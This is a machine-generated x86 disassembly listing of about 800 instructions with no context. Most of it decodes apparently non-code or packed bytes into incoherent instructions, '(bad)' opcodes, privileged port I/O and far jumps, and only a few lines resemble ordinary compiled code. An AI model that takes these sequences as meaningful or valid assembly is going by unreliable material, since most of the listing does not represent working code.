  41880a:	mov    ebx,0x70988a1d
  41880f:	jl     0x4187e9
  418811:	xchg   ebx,eax
  418812:	jge    0x41884f
  418814:	clc    
  418815:	cmp    ch,BYTE PTR [edx-0x6b]
  418818:	(bad)  
  418819:	xor    BYTE PTR [edx+0x16],dh
  41881c:	mov    ch,0xda
  41881e:	or     al,0x1e
  418820:	in     eax,dx
  418821:	loope  0x418850
  418823:	push   ecx
  418824:	xchg   esi,eax
  418825:	push   es
  418826:	cld    
  418827:	mov    edx,0x20f0e134
  41882c:	into   
  41882d:	dec    esi
  41882e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41882f:	(bad)  
  418830:	loopne 0x418882
  418832:	mov    edx,0x9c6c5667
  418837:	push   ds
  418838:	lock sub esi,DWORD PTR [eax+0x23]
  41883c:	xchg   esi,eax
  41883d:	ins    DWORD PTR es:[edi],dx
  41883e:	cwde   
  41883f:	cld    
  418840:	sub    eax,0x8e3a4212
  418845:	mov    BYTE PTR [eax],dl
  418847:	cld    
  418848:	lea    esi,[ecx+0x479f727d]
  41884e:	fsubrp st(2),st
  418850:	mov    WORD PTR [ebx],ds
  418852:	push   edx
  418853:	mov    ecx,0x283c85cb
  418858:	aam    0xd3
  41885a:	(bad)  
  41885b:	cmp    bh,dh
  41885d:	mov    esi,0x1505be2c
  418862:	pop    eax
  418863:	xchg   esp,eax
  418864:	ror    DWORD PTR [ecx],cl
  418866:	ret    0x52fd
  418869:	test   ecx,ebx
  41886b:	iret   
  41886c:	pop    eax
  41886d:	loop   0x418810
  41886f:	stc    
  418870:	and    ch,BYTE PTR [esi-0x21]
  418873:	js     0x41880a
  418875:	ja     0x4188d6
  418877:	add    edx,edx
  418879:	xchg   esi,eax
  41887a:	cmp    al,BYTE PTR cs:[edi]
  41887d:	adc    edi,eax
  41887f:	xor    dh,ah
  418881:	xchg   ebx,eax
  418882:	imul   ecx,DWORD PTR [edx+0x45],0x51
  418886:	fmul   st,st(4)
  418888:	ins    BYTE PTR es:[edi],dx
  418889:	jne    0x41887a
  41888b:	mov    DWORD PTR [ebx],eax
  41888d:	out    dx,al
  41888e:	test   eax,0xf3029fcb
  418893:	div    dl
  418895:	push   esp
  418896:	fild   QWORD PTR [eax+0x35]
  418899:	repnz mov eax,ds:0xa6228ef3
  41889f:	xor    ebx,edi
  4188a1:	jb     0x4188ef
  4188a3:	pusha  
  4188a4:	into   
  4188a5:	out    dx,eax
  4188a6:	pop    ds
  4188a7:	out    0x70,eax
  4188a9:	fsubr  st,st(3)
  4188ab:	jle    0x418855
  4188ad:	sub    DWORD PTR [ebp+0x1ea83efe],0x0
  4188b4:	adc    DWORD PTR ds:0x3ef769f3,ebp
  4188ba:	jg     0x4188fc
  4188bc:	ja     0x418891
  4188be:	jo     0x4188dd
  4188c0:	nop
  4188c1:	ret    0x8390
  4188c4:	loop   0x418897
  4188c6:	push   ds
  4188c7:	test   esi,ecx
  4188c9:	lahf   
  4188ca:	sti    
  4188cb:	jle    0x4188be
  4188cd:	bound  edi,QWORD PTR [edi-0x7c]
  4188d0:	dec    ebp
  4188d1:	xor    dh,BYTE PTR [eax-0x3d]
  4188d4:	xlat   BYTE PTR ds:[ebx]
  4188d5:	mov    ebx,0x65f09554
  4188da:	dec    esp
  4188db:	repz clc 
  4188dd:	mov    cl,0x69
  4188df:	not    DWORD PTR [eax]
  4188e1:	dec    esp
  4188e2:	std    
  4188e3:	mov    eax,ds:0x1406aa6e
  4188e8:	mov    dl,0xa2
  4188ea:	mov    WORD PTR [edi-0xe],gs
  4188ed:	(bad)  
  4188ee:	daa    
  4188ef:	jo     0x4188d2
  4188f1:	push   ecx
  4188f2:	dec    ebp
  4188f3:	jnp    0x41892f
  4188f5:	into   
  4188f6:	scas   eax,DWORD PTR es:[edi]
  4188f7:	gs iret 
  4188f9:	popf   
  4188fa:	je     0x418955
  4188fc:	(bad)  
  4188fd:	mov    bh,0x3b
  4188ff:	jg     0x418944
  418901:	cs jno 0x4188a4
  418904:	aam    0x76
  418906:	stos   DWORD PTR es:[edi],eax
  418907:	call   0xdf62ff8f
  41890c:	push   es
  41890d:	addr16 jb 0x418981
  418910:	rcl    BYTE PTR [eax+eiz*2],0x7e
  418914:	pop    esi
  418915:	lods   eax,DWORD PTR ds:[esi]
  418916:	xor    al,0x45
  418918:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418919:	mov    eax,0x34e9e5fb
  41891e:	pop    ds
  41891f:	loopne 0x418975
  418921:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  418923:	scas   al,BYTE PTR es:[edi]
  418924:	fnstcw WORD PTR [ebx]
  418926:	hlt    
  418927:	dec    edi
  418928:	push   eax
  418929:	(bad)  
  41892a:	inc    ebp
  41892b:	add    dh,BYTE PTR [edx-0x39]
  41892e:	dec    ebx
  41892f:	xchg   ebx,eax
  418930:	int3   
  418931:	push   ss
  418932:	jmp    0x13bb7e14
  418937:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418938:	call   0x7cdb:0x8e1151ca
  41893f:	adc    eax,0x8a7a7184
  418944:	mov    ecx,0x91d72670
  418949:	scas   eax,DWORD PTR es:[edi]
  41894a:	imul   edx,DWORD PTR [edi],0x7c
  41894d:	lea    ebp,[ebx]
  41894f:	dec    esp
  418950:	add    BYTE PTR [eax-0x764e3cfd],dl
  418956:	adc    eax,0xa3599aec
  41895b:	or     DWORD PTR [ebx-0x52e6feaa],esi
  418961:	xlat   BYTE PTR ds:[ebx]
  418962:	add    bh,BYTE PTR [ecx]
  418964:	pusha  
  418965:	mov    bl,bh
  418967:	mov    edi,0xcba1ca18
  41896c:	xchg   ebx,eax
  41896d:	dec    edx
  41896e:	inc    edi
  41896f:	retf   
  418970:	shl    BYTE PTR [edi*1-0x666b384a],1
  418977:	or     ebp,DWORD PTR [edi-0x2643ea]
  41897d:	sub    DWORD PTR [eax],ecx
  41897f:	push   edx
  418980:	retf   0xc4d1
  418983:	cmp    eax,0x98862373
  418988:	cld    
  418989:	inc    ebx
  41898a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41898b:	inc    ebp
  41898c:	test   DWORD PTR [ecx],0x657d819
  418992:	(bad)  
  418993:	adc    edx,esp
  418995:	loopne 0x418a14
  418997:	dec    edi
  418998:	fld    DWORD PTR [eax]
  41899a:	sbb    BYTE PTR [ebp+0x3c],ch
  41899d:	sub    esp,ecx
  41899f:	mov    ds:0x5d309085,eax
  4189a4:	mov    eax,ds:0x8b93a222
  4189a9:	and    esp,DWORD PTR ds:[edx+eiz*1]
  4189ad:	pop    eax
  4189ae:	sahf   
  4189af:	mov    bh,0x35
  4189b1:	add    DWORD PTR [ebx-0x13],0xf820c026
  4189b8:	adc    BYTE PTR [eax-0x51e4e9c4],0x67
  4189bf:	adc    DWORD PTR ds:0xc023b19,ebp
  4189c5:	mov    dl,0x17
  4189c7:	out    0x6f,eax
  4189c9:	sub    DWORD PTR [edx+0x318de6e5],0x62869af
  4189d3:	mov    edi,DWORD PTR [edi-0x4d945679]
  4189d9:	push   eax
  4189da:	cmp    eax,0x9ff22c01
  4189df:	rcl    ah,1
  4189e1:	pop    ecx
  4189e2:	dec    ecx
  4189e3:	(bad)  
  4189e4:	aam    0x9d
  4189e6:	and    ebx,0xffffffa8
  4189e9:	hlt    
  4189ea:	stos   BYTE PTR es:[edi],al
  4189eb:	fdivr  st(2),st
  4189ed:	or     DWORD PTR ds:0xebf050f,0xfffffffb
  4189f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189f5:	jne    0x4189ce
  4189f7:	jmp    0x76e294f4
  4189fc:	mov    dl,0x5
  4189fe:	in     al,dx
  4189ff:	adc    eax,0x2659dc73
  418a04:	push   esi
  418a05:	into   
  418a06:	jg     0x418a0e
  418a08:	stos   DWORD PTR es:[edi],eax
  418a09:	sub    bh,BYTE PTR [ecx]
  418a0b:	inc    ebx
  418a0c:	pop    eax
  418a0d:	push   cs
  418a0e:	loop   0x418a57
  418a10:	mov    edi,0x79ed8775
  418a15:	loop   0x4189dd
  418a17:	jge    0x4189e3
  418a19:	enter  0xd354,0xb8
  418a1d:	cmp    BYTE PTR [ecx+0x1b],ch
  418a20:	mov    eax,DWORD PTR [ebp+0xc]
  418a23:	xor    eax,ecx
  418a25:	mov    ecx,DWORD PTR [ebp-0x8]
  418a28:	add    eax,edx
  418a2a:	imul   eax,ecx
  418a2d:	jmp    0x41adec
  418a32:	clc    
  418a33:	loope  0x4189be
  418a35:	mov    ah,0x87
  418a37:	test   bl,al
  418a39:	mov    ebp,0x3e8f68ea
  418a3e:	xor    eax,0x399d7bc3
  418a43:	pop    ds
  418a44:	popa   
  418a45:	(bad)  
  418a46:	rcr    BYTE PTR [edi+0x62],0x62
  418a4a:	inc    edx
  418a4b:	cmc    
  418a4c:	sti    
  418a4d:	add    bl,BYTE PTR [esi]
  418a4f:	adc    ebp,ebx
  418a51:	adc    dh,BYTE PTR ds:0xc2cab3fb
  418a57:	fxch   st(1)
  418a59:	jb     0x418a14
  418a5b:	nop
  418a5c:	repnz cmp edx,DWORD PTR [eax-0x67e12a49]
  418a63:	mov    ds:0xc4ba07dd,al
  418a68:	dec    ebp
  418a69:	aaa    
  418a6a:	jmp    0xca3c65d9
  418a6f:	sub    ecx,ebx
  418a71:	inc    edx
  418a72:	push   edi
  418a73:	mov    al,0xc
  418a75:	pop    ds
  418a76:	cs inc esp
  418a78:	xchg   edi,eax
  418a79:	push   0x61
  418a7b:	enter  0x9ae3,0x3b
  418a7f:	adc    bl,bh
  418a81:	add    al,BYTE PTR [edi-0x38]
  418a84:	into   
  418a85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a86:	retf   0xb12e
  418a89:	pop    ss
  418a8a:	cmc    
  418a8b:	sub    ah,ah
  418a8d:	test   edx,esi
  418a8f:	adc    BYTE PTR [ebp-0x79bdd28e],ah
  418a95:	aaa    
  418a96:	jns    0x418acd
  418a98:	pop    ds
  418a99:	mov    edx,0x8e5d1098
  418a9e:	xor    DWORD PTR [ebp-0x71ae27d6],0xc04d9ed6
  418aa8:	not    BYTE PTR [edx-0x1]
  418aab:	je     0x418ac3
  418aad:	arpl   WORD PTR [eax+0x39345b07],si
  418ab3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ab4:	fisubr WORD PTR [edx-0x48]
  418ab7:	pop    ecx
  418ab8:	pop    ecx
  418ab9:	jb     0x418b34
  418abb:	adc    DWORD PTR [edx],esp
  418abd:	stos   DWORD PTR es:[edi],eax
  418abe:	jnp    0x418af2
  418ac0:	cs jle 0x418b3a
  418ac3:	xchg   edi,eax
  418ac4:	mov    ch,0x6f
  418ac6:	fnstcw WORD PTR [eax+0x2]
  418ac9:	in     al,0x1a
  418acb:	leave  
  418acc:	sahf   
  418acd:	jmp    0x418af0
  418acf:	xchg   edx,eax
  418ad0:	xchg   edi,eax
  418ad1:	or     al,0x49
  418ad3:	sub    DWORD PTR [edi-0x6a34c05a],edx
  418ad9:	xor    bl,BYTE PTR [edx]
  418adb:	cmp    esp,DWORD PTR [eax-0x18]
  418ade:	pushf  
  418adf:	push   esi
  418ae0:	ja     0x418a73
  418ae2:	lock push ecx
  418ae4:	push   cs
  418ae5:	xor    al,0xff
  418ae7:	inc    edx
  418ae8:	xor    dl,dh
  418aea:	leave  
  418aeb:	or     eax,0x64850d73
  418af0:	in     eax,dx
  418af1:	fistp  DWORD PTR [esi+0x5814a229]
  418af7:	stos   BYTE PTR es:[edi],al
  418af8:	dec    edx
  418af9:	lods   eax,DWORD PTR ds:[esi]
  418afa:	add    eax,edi
  418afc:	mov    edx,0xc90f5c14
  418b01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b02:	neg    ecx
  418b04:	adc    al,0xe0
  418b06:	and    esi,esp
  418b08:	outs   dx,BYTE PTR ds:[esi]
  418b09:	sub    BYTE PTR [edx],ah
  418b0b:	pusha  
  418b0c:	mov    edx,0x56cdee8e
  418b11:	xor    ebp,DWORD PTR [esp+ebx*4]
  418b14:	(bad)  
  418b15:	cld    
  418b16:	in     al,dx
  418b17:	push   eax
  418b18:	mov    ds:0x87d8d859,al
  418b1d:	mov    ds:0xd5596108,eax
  418b22:	sti    
  418b23:	dec    edi
  418b24:	clc    
  418b25:	lods   al,BYTE PTR ds:[esi]
  418b26:	sti    
  418b27:	dec    ebx
  418b28:	xor    eax,0x84306d15
  418b2d:	inc    edx
  418b2e:	add    eax,0x7f79f869
  418b33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b34:	test   DWORD PTR [ebp-0x41],0x7689ee7f
  418b3b:	jp     0x418b59
  418b3d:	popa   
  418b3e:	mov    ah,0x36
  418b40:	shl    DWORD PTR [edi-0x43],0xe1
  418b44:	inc    edi
  418b45:	in     eax,0xcb
  418b47:	pop    eax
  418b48:	jb     0x418ae1
  418b4a:	add    ecx,ebp
  418b4c:	rcl    BYTE PTR [ecx-0x135c6ebb],0xd2
  418b53:	fst    DWORD PTR [eax+ebp*1-0xa]
  418b57:	or     DWORD PTR [esi+esi*1],0x6c
  418b5b:	adc    DWORD PTR [eax-0x63],0x3e
  418b5f:	repnz push ecx
  418b61:	aam    0xb7
  418b63:	inc    edi
  418b64:	or     DWORD PTR [edx+0x5e],ebx
  418b67:	call   0xa91e43de
  418b6c:	sbb    cl,BYTE PTR [eax-0x48faa8ef]
  418b72:	hlt    
  418b73:	(bad)  
  418b74:	loopne 0x418b59
  418b76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b77:	idiv   DWORD PTR [edx-0x76]
  418b7a:	test   BYTE PTR [ecx-0x47],0x14
  418b7e:	mov    DWORD PTR [esi-0x38],eax
  418b81:	pusha  
  418b82:	ss stc 
  418b84:	scas   al,BYTE PTR es:[edi]
  418b85:	test   eax,0xe9569144
  418b8a:	shl    BYTE PTR [ebx-0x116b6798],cl
  418b90:	push   esi
  418b91:	jae    0x418b99
  418b93:	or     BYTE PTR ds:0x93fd74cb,bl
  418b99:	inc    ebp
  418b9a:	int3   
  418b9b:	cmp    esi,esp
  418b9d:	pushf  
  418b9e:	fcomi  st,st(5)
  418ba0:	sub    DWORD PTR [ebx+0x68dca2da],ecx
  418ba6:	ja     0x418b71
  418ba8:	xchg   ebp,eax
  418ba9:	inc    ecx
  418baa:	push   eax
  418bab:	adc    eax,0x66aa42be
  418bb0:	les    eax,FWORD PTR [edi-0x4f418cba]
  418bb6:	mov    bl,0x9f
  418bb8:	dec    edi
  418bb9:	ret    
  418bba:	mov    bl,0xf6
  418bbc:	in     al,0x65
  418bbe:	and    eax,0xb991fbc6
  418bc3:	out    dx,eax
  418bc4:	cmp    eax,0x600a4ab2
  418bc9:	shl    BYTE PTR [ecx-0x69f81299],0x7a
  418bd0:	add    BYTE PTR [ebx+ecx*8],bh
  418bd3:	rcr    ecx,1
  418bd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bd6:	or     al,0x13
  418bd8:	mov    esi,0xf2e3ea69
  418bdd:	pusha  
  418bde:	ja     0x418bd9
  418be0:	xlat   BYTE PTR ds:[ebx]
  418be1:	cmp    eax,0xb08af0c8
  418be6:	push   edi
  418be7:	push   ebp
  418be8:	dec    ebp
  418be9:	add    esp,DWORD PTR [edx]
  418beb:	leave  
  418bec:	add    eax,0x46e5bc00
  418bf1:	push   ss
  418bf2:	mov    ecx,0x531ba46f
  418bf7:	jne    0x418c2e
  418bf9:	mov    bh,0x9e
  418bfb:	dec    esp
  418bfc:	cmp    bl,dh
  418bfe:	dec    esp
  418bff:	xor    esi,DWORD PTR [edx-0x2a]
  418c02:	xor    al,0x2c
  418c04:	ret    
  418c05:	mov    eax,ds:0xede320c5
  418c0a:	sub    edx,esp
  418c0c:	sub    ebx,edx
  418c0e:	add    al,0xfa
  418c10:	inc    eax
  418c11:	fcmove st,st(1)
  418c13:	dec    esi
  418c14:	dec    edi
  418c15:	pop    ds
  418c16:	(bad)  
  418c18:	jg     0x418bc8
  418c1a:	out    dx,eax
  418c1b:	and    eax,0x206d05fc
  418c20:	(bad)  
  418c21:	iret   
  418c22:	imul   eax,eax,0xd51267f1
  418c28:	push   ss
  418c29:	enter  0x34b5,0x38
  418c2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c2e:	push   cs
  418c2f:	push   ds
  418c30:	mov    bh,0xe1
  418c32:	into   
  418c33:	jns    0x418c53
  418c35:	es sbb al,0x8c
  418c38:	xchg   ebp,eax
  418c39:	mov    ebp,0x8b7a67e5
  418c3e:	jecxz  0x418c21
  418c40:	inc    ebx
  418c41:	sbb    eax,0xc3fda237
  418c46:	test   eax,0xad407776
  418c4b:	push   ecx
  418c4c:	loopne 0x418bfc
  418c4e:	dec    eax
  418c4f:	retf   
  418c50:	(bad)  
  418c51:	dec    ecx
  418c52:	and    eax,0xda24998d
  418c57:	mov    ah,0x6f
  418c59:	inc    esi
  418c5a:	loopne 0x418c2c
  418c5c:	push   0x5ee06477
  418c61:	aad    0xb4
  418c63:	jecxz  0x418c3d
  418c65:	sbb    esi,DWORD PTR [edx]
  418c67:	mov    dl,0x26
  418c69:	inc    BYTE PTR [ebx]
  418c6b:	cdq    
  418c6c:	jl     0x418ca8
  418c6e:	lods   eax,DWORD PTR ds:[esi]
  418c6f:	inc    ebp
  418c70:	cwde   
  418c71:	adc    eax,0x84acd2b7
  418c76:	or     dh,BYTE PTR [ecx-0x53]
  418c79:	setb   BYTE PTR [edx-0x6d]
  418c7d:	mov    edx,0x9f468b79
  418c82:	or     al,0x75
  418c84:	fcomp  DWORD PTR [ebp+0x70d88ab3]
  418c8a:	lds    eax,FWORD PTR [edi+eax*1+0x470eed27]
  418c91:	cmp    bl,BYTE PTR [esi]
  418c93:	rcl    al,1
  418c95:	mov    ds:0xfacf1ecb,eax
  418c9a:	push   es
  418c9b:	stos   BYTE PTR es:[edi],al
  418c9c:	push   ecx
  418c9d:	pop    esi
  418c9e:	into   
  418c9f:	adc    eax,0x8ec8e920
  418ca4:	mov    bl,0xa
  418ca6:	jae    0x418d23
  418ca8:	or     al,BYTE PTR [ecx-0x34]
  418cab:	out    dx,al
  418cac:	dec    ebx
  418cad:	clc    
  418cae:	sbb    eax,0x2eb90d4f
  418cb3:	jmp    0x418ca2
  418cb5:	cmc    
  418cb6:	push   esi
  418cb7:	mov    ebp,0x6b3dc4af
  418cbc:	clc    
  418cbd:	aas    
  418cbe:	std    
  418cbf:	arpl   WORD PTR [edx-0x23],dx
  418cc2:	and    al,0x7b
  418cc4:	or     eax,0xed582e6e
  418cc9:	inc    ecx
  418cca:	pop    ebx
  418ccb:	inc    DWORD PTR [esi]
  418ccd:	fdiv   QWORD PTR ds:0xe11e3eee
  418cd3:	mov    esp,0xfcf5b043
  418cd8:	sub    edx,DWORD PTR ds:0xec652731
  418cde:	jno    0x418ce1
  418ce0:	add    ch,BYTE PTR [esi]
  418ce2:	cld    
  418ce3:	mov    ch,0xae
  418ce5:	sub    ebx,DWORD PTR [ebp+eax*8+0x115f529a]
  418cec:	(bad)  
  418ced:	pop    ss
  418cee:	sub    BYTE PTR [ebp+esi*2+0x7f],cl
  418cf2:	push   edi
  418cf3:	sub    ch,BYTE PTR [edi+eax*1]
  418cf6:	xor    BYTE PTR [ebp+0x78e2cbe3],0x79
  418cfd:	dec    esp
  418cfe:	jns    0x418ce6
  418d00:	inc    esi
  418d01:	add    al,0x9
  418d03:	fcom   DWORD PTR [ebp+0x1d8a3650]
  418d09:	adc    BYTE PTR [ebp+0x7a],al
  418d0c:	pop    ecx
  418d0d:	lods   al,BYTE PTR ds:[esi]
  418d0e:	inc    esi
  418d0f:	jnp    0x418d2f
  418d11:	out    0x6,al
  418d13:	adc    cl,BYTE PTR [edx]
  418d15:	inc    eax
  418d16:	mov    eax,ds:0xa235f82
  418d1b:	retf   0x77b4
  418d1e:	or     BYTE PTR [edi+0x6edfccfd],0x78
  418d25:	ficom  DWORD PTR [eax+0x2]
  418d28:	outs   dx,BYTE PTR ds:[esi]
  418d29:	ins    BYTE PTR es:[edi],dx
  418d2a:	xor    eax,DWORD PTR [edi+0x5]
  418d2d:	mov    bh,0x1e
  418d2f:	mov    eax,0x55a7109d
  418d34:	xor    dh,bh
  418d36:	mov    dl,0x71
  418d38:	adc    BYTE PTR [ebp-0x31],0x97
  418d3c:	dec    eax
  418d3d:	sub    edx,DWORD PTR [eax+0xd]
  418d40:	xchg   BYTE PTR [edi],cl
  418d42:	test   BYTE PTR [ecx],dh
  418d44:	retf   0x6e4a
  418d47:	arpl   WORD PTR [ebx+0x4e5712b6],di
  418d4d:	iret   
  418d4e:	mov    esi,0xfb4b067a
  418d53:	and    al,0xc3
  418d55:	add    al,0xa2
  418d57:	stos   BYTE PTR es:[edi],al
  418d58:	mul    BYTE PTR [eax+0x7]
  418d5b:	or     DWORD PTR [ebp+0x18],ecx
  418d5e:	pop    eax
  418d5f:	cmp    BYTE PTR [esp+ebx*2-0x685047ec],al
  418d66:	xor    eax,0xe60f1804
  418d6b:	fs pop es
  418d6d:	(bad)  
  418d6e:	push   ds
  418d6f:	cld    
  418d70:	imul   DWORD PTR [ebp+0x35]
  418d73:	pop    ebx
  418d74:	cmp    al,0x83
  418d76:	push   ebx
  418d77:	mov    BYTE PTR [ecx],dh
  418d79:	pop    ebp
  418d7a:	jmp    0xda32:0xf3852e20
  418d81:	gs es mov ecx,0x2dbd9031
  418d88:	int    0x77
  418d8a:	mov    ebx,0x7823fee0
  418d8f:	xchg   ebx,eax
  418d90:	pop    esi
  418d91:	enter  0xed8,0x57
  418d95:	retf   
  418d96:	fcmovnb st,st(0)
  418d98:	mul    BYTE PTR [ebx]
  418d9a:	xchg   BYTE PTR [ecx+eiz*2-0x53],ch
  418d9e:	or     al,0x77
  418da0:	mov    ah,0x3b
  418da2:	pop    esp
  418da3:	dec    esi
  418da4:	inc    edi
  418da5:	jge    0x418d92
  418da7:	stos   DWORD PTR es:[edi],eax
  418da8:	dec    eax
  418da9:	int    0xca
  418dab:	sub    al,0x45
  418dad:	pop    ss
  418dae:	inc    edi
  418daf:	or     BYTE PTR [esi-0x3b68ebba],0x91
  418db6:	and    DWORD PTR [edi],esp
  418db8:	pop    ecx
  418db9:	(bad)  [esi+0x26]
  418dbc:	mov    ebx,DWORD PTR [edx+0x7a]
  418dbf:	dec    ebx
  418dc0:	mov    ah,0x67
  418dc2:	jnp    0x418e2d
  418dc4:	mov    ecx,DWORD PTR [edx+0x11]
  418dc7:	mov    eax,esi
  418dc9:	adc    cl,BYTE PTR [ebp-0xd0b352d]
  418dcf:	xchg   esp,eax
  418dd0:	pop    es
  418dd1:	in     al,0x59
  418dd3:	and    esi,DWORD PTR [esi]
  418dd5:	dec    ebp
  418dd6:	pop    esi
  418dd7:	mov    ds:0xd5ae52c9,eax
  418ddc:	in     eax,0xa
  418dde:	xor    cl,BYTE PTR [edx+0xd5d6eb6]
  418de4:	jnp    0x418def
  418de6:	int    0xea
  418de8:	push   ss
  418de9:	pop    ds
  418dea:	stc    
  418deb:	cmp    bl,BYTE PTR [edi+0x32a927cf]
  418df1:	push   ss
  418df2:	(bad)  
  418df3:	sub    eax,DWORD PTR [edi+ebx*2-0x6ab17085]
  418dfa:	lods   al,BYTE PTR ds:[esi]
  418dfb:	and    BYTE PTR [ebp+eiz*8+0x4b],0xd5
  418e00:	dec    ecx
  418e01:	or     edi,DWORD PTR [edi-0x325097af]
  418e07:	(bad)  
  418e08:	cmp    eax,DWORD PTR [ebp+ecx*1-0xe]
  418e0c:	dec    eax
  418e0d:	iret   
  418e0e:	and    edi,DWORD PTR [ebp+0x6d]
  418e11:	ins    DWORD PTR es:[edi],dx
  418e12:	mov    edx,0x67000d91
  418e17:	clc    
  418e18:	stos   DWORD PTR es:[edi],eax
  418e19:	push   es
  418e1a:	or     bh,ah
  418e1c:	test   cl,al
  418e1e:	sub    ch,BYTE PTR [eax+0x9]
  418e21:	pop    es
  418e22:	cmp    ebx,DWORD PTR ds:0x9078f778
  418e28:	xor    dh,BYTE PTR [ebp-0x70f5c9fa]
  418e2e:	pushf  
  418e2f:	repz ret 0xdc07
  418e33:	push   eax
  418e34:	or     al,0xae
  418e36:	cld    
  418e37:	add    al,0xbb
  418e39:	inc    ecx
  418e3a:	xchg   ebx,eax
  418e3b:	inc    esi
  418e3c:	xchg   BYTE PTR [edx+0xd],ah
  418e3f:	(bad)  
  418e40:	xor    DWORD PTR [ebx+0x4f],esi
  418e43:	std    
  418e44:	stos   BYTE PTR es:[edi],al
  418e45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e46:	ror    BYTE PTR [edi+0x5d20acce],0xb0
  418e4d:	sbb    eax,0x6150f3f9
  418e52:	pop    ecx
  418e53:	cmc    
  418e54:	dec    ebx
  418e55:	aam    0x7c
  418e57:	sub    al,0xf
  418e5a:	jge    0x418e40
  418e5c:	pop    edx
  418e5d:	mov    BYTE PTR [ebx-0x40],bh
  418e60:	(bad)  
  418e62:	push   0x29083029
  418e67:	mov    ecx,0xa48a0215
  418e6c:	js     0x418e17
  418e6e:	push   edx
  418e6f:	adc    DWORD PTR [esi+0xc2f9bb6],eax
  418e75:	mov    cl,0xf2
  418e77:	xchg   ecx,eax
  418e78:	test   al,0x6
  418e7a:	pop    ebp
  418e7b:	ja     0x418e55
  418e7d:	sub    al,0x7b
  418e7f:	bound  ebp,QWORD PTR [ebx+eiz*2+0x2f]
  418e83:	jns    0x418e38
  418e85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e86:	in     al,0xe0
  418e88:	rol    BYTE PTR [ebx],0x39
  418e8b:	jmp    0x822f:0x916a369f
  418e92:	mov    al,0xfd
  418e94:	cmp    eax,0x9dee8acc
  418e99:	ja     0x418eef
  418e9b:	(bad)  
  418e9c:	mov    bh,0x28
  418e9e:	(bad)  
  418ea0:	jmp    0x8d94b4fe
  418ea5:	dec    ebx
  418ea6:	jns    0x418e3b
  418ea8:	mov    ds:0x191377d9,al
  418ead:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418eae:	sti    
  418eaf:	mov    ds:0xf75b86f7,al
  418eb4:	adc    ah,ch
  418eb6:	js     0x418f10
  418eb8:	inc    eax
  418eb9:	and    DWORD PTR [edi+edi*8-0x506184e7],edx
  418ec0:	jecxz  0x418e4f
  418ec2:	test   DWORD PTR [ebx],ecx
  418ec4:	int    0x67
  418ec6:	adc    DWORD PTR [ecx+0x40ab1f79],edi
  418ecc:	or     DWORD PTR [edx-0x63bde9b0],edx
  418ed2:	xchg   dh,cl
  418ed4:	sbb    DWORD PTR [edi-0x1d105382],ebx
  418eda:	repz jne 0x418ea1
  418edd:	or     BYTE PTR [esi-0x4b],dl
  418ee0:	adc    DWORD PTR [edi-0x21],ebx
  418ee3:	enter  0x9aa6,0xa2
  418ee7:	bound  edi,QWORD PTR [ecx]
  418ee9:	mov    edi,0x5f9baf32
  418eee:	dec    ebp
  418eef:	aas    
  418ef0:	das    
  418ef1:	sti    
  418ef2:	mov    bl,0xc9
  418ef4:	out    0xbc,al
  418ef6:	es add bx,0xfffd
  418efb:	imul   ebx,DWORD PTR ds:0x1f5b96f5,0x73
  418f02:	xlat   BYTE PTR ds:[ebx]
  418f03:	loopne 0x418f18
  418f05:	cwde   
  418f06:	xor    BYTE PTR [ebx+ebp*2-0x4e4e8bc7],cl
  418f0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f0e:	lea    ebp,[eax+0x66cf5eac]
  418f14:	sbb    dh,al
  418f16:	mov    eax,0x490e127f
  418f1b:	xlat   BYTE PTR ds:[ebx]
  418f1c:	retf   0x7570
  418f1f:	sub    bl,bl
  418f21:	daa    
  418f22:	mov    eax,ds:0x30266374
  418f27:	in     al,dx
  418f28:	dec    edx
  418f29:	repz fwait
  418f2b:	and    BYTE PTR [esi],0xcd
  418f2e:	xlat   BYTE PTR gs:[ebx]
  418f30:	sbb    ah,bl
  418f32:	popf   
  418f33:	mov    ?,WORD PTR [edx]
  418f35:	jle    0x418f75
  418f37:	inc    esi
  418f38:	int3   
  418f39:	sub    al,0xa7
  418f3b:	jns    0x418f97
  418f3d:	lds    ecx,FWORD PTR [ebx+edx*1]
  418f40:	push   es
  418f41:	shl    ebx,0xaa
  418f44:	retf   
  418f45:	cdq    
  418f46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f48:	push   cs
  418f49:	adc    al,0xaa
  418f4b:	bound  eax,QWORD PTR [esi+0x1dd39530]
  418f51:	xchg   edx,eax
  418f52:	xor    ah,ah
  418f54:	(bad)  
  418f55:	cmc    
  418f56:	xor    DWORD PTR [eax],ecx
  418f58:	push   ds
  418f59:	or     ah,bh
  418f5b:	nop
  418f5c:	call   0xe9ce:0x22e973fb
  418f63:	add    eax,0x1c2ab4c
  418f68:	mov    al,ds:0xce4338ef
  418f6d:	out    dx,al
  418f6e:	jp     0x418fa9
  418f70:	xor    bl,BYTE PTR ss:[edi-0x70fbb486]
  418f77:	sub    BYTE PTR ds:0xce8d104e,dh
  418f7d:	push   ebp
  418f7e:	xor    BYTE PTR [edi],0xcd
  418f81:	lds    esp,FWORD PTR [esi+0x31]
  418f84:	mov    WORD PTR [ecx-0x351b78a6],?
  418f8a:	(bad)  
  418f8c:	fldenv [ecx+0x30]
  418f8f:	inc    esi
  418f90:	add    BYTE PTR [eax+0x56fd6bfa],0xf6
  418f97:	fimul  WORD PTR [edi]
  418f99:	and    ecx,eax
  418f9b:	mov    bh,0x95
  418f9d:	(bad)  
  418f9e:	sbb    ch,ch
